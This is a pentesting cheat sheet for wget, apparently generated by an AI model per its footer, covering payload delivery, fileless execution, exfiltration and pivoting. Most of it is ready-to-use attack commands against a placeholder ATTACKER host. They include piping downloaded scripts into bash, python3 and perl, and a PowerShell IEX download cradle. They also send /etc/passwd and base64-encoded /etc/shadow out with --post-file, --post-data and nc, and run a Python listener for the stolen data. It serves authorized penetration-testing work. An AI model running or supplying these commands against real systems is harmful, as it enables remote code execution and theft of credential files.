# wget

**Tags:** `#wget` `#filetransfer` `#download` `#linux` `#fileless`

Linux HTTP/FTP download utility. Primary use in pentesting: pull tools and payloads onto a Linux target from your HTTP server. Supports in-memory execution (pipe to shell/python), authenticated downloads, recursive mirroring, and custom headers for bypassing basic controls. Pre-installed on almost every Linux distro.

**Source:** Pre-installed on Linux
**Kali HTTP server:** `python3 -m http.server 8080`

```bash
# Download file
wget http://ATTACKER/tool.sh -O /tmp/tool.sh

# Download and execute without writing to disk
wget -qO- http://ATTACKER/shell.sh | bash
```

---

## Basic Download

```bash
# Download to current directory (keeps original filename)
wget http://ATTACKER/tool

# Specify output path/filename
wget http://ATTACKER/tool -O /tmp/mytool

# Background download
wget -b http://ATTACKER/largefile -O /tmp/largefile

# Quiet (no output — OPSEC)
wget -q http://ATTACKER/tool -O /tmp/tool

# Resume interrupted download
wget -c http://ATTACKER/largefile -O /tmp/largefile
```

---

## In-Memory / Fileless Execution

```bash
# Download and execute bash script without writing to disk
wget -qO- http://ATTACKER/shell.sh | bash

# Download and run Python script
wget -qO- http://ATTACKER/exploit.py | python3

# Download and run Perl
wget -qO- http://ATTACKER/exploit.pl | perl

# PowerShell equivalent (Windows target pulling from your server)
# IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
```

---

## Authenticated Downloads

```bash
# HTTP Basic auth
wget --user=admin --password=Password http://192.168.1.10/protected/file

# Cookie-based auth
wget --header="Cookie: session=abc123" http://target.com/protected/file

# Custom headers
wget --header="Authorization: Bearer TOKEN" http://api.target.com/file
wget --header="X-API-Key: abc123" http://api.target.com/file

# Custom User-Agent (bypass basic filtering)
wget -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://ATTACKER/tool
```

---

## Proxy / Pivot

```bash
# HTTP proxy
wget -e use_proxy=yes -e http_proxy=127.0.0.1:8080 http://ATTACKER/tool

# SOCKS proxy (via proxychains)
proxychains wget http://ATTACKER/tool -O /tmp/tool
```

---

## Uploading / Exfil via wget

wget doesn't natively POST files, but can send data:

```bash
# POST data to a receiver (e.g., simple HTTP receiver on Kali)
wget --post-file=/etc/passwd http://ATTACKER:8000/upload

# POST raw data
wget --post-data="$(cat /etc/shadow | base64)" http://ATTACKER:8000/recv

# Kali receiver — simple HTTP POST listener
python3 -c "
import http.server, urllib.parse
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers['Content-Length'])
        print(self.rfile.read(l).decode())
        self.send_response(200); self.end_headers()
http.server.HTTPServer(('', 8000), H).serve_forever()
"
```

---

## Recursive / Mirror Download

```bash
# Mirror an entire website
wget -r -l3 http://target.com

# Download all files of a specific type
wget -r -A "*.pdf,*.docx,*.xlsx" http://target.com/files/

# No parent directory traversal
wget -r --no-parent http://target.com/docs/
```

---

## Useful Flags

| Flag | Description |
|---|---|
| `-O <file>` | Output filename |
| `-q` | Quiet mode |
| `-qO-` | Quiet, output to stdout (pipe-friendly) |
| `-c` | Continue/resume download |
| `-b` | Background download |
| `-r` | Recursive |
| `-l <depth>` | Recursion depth |
| `-A <ext>` | Accept file types |
| `-R <ext>` | Reject file types |
| `--no-check-certificate` | Skip SSL verification |
| `-e robots=off` | Ignore robots.txt |
| `--timeout=<s>` | Connection timeout |
| `--tries=<n>` | Retry count |

---

## Setting Up the Kali Server

```bash
# Python HTTP server (most common)
python3 -m http.server 80
python3 -m http.server 8080

# Serve from specific directory
python3 -m http.server 80 --directory /opt/tools

# Apache (persistent)
sudo systemctl start apache2
# Files in /var/www/html/

# Upload receiver (nc)
nc -lvnp 9001 > received_file
# Target: cat /etc/passwd | nc ATTACKER 9001
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
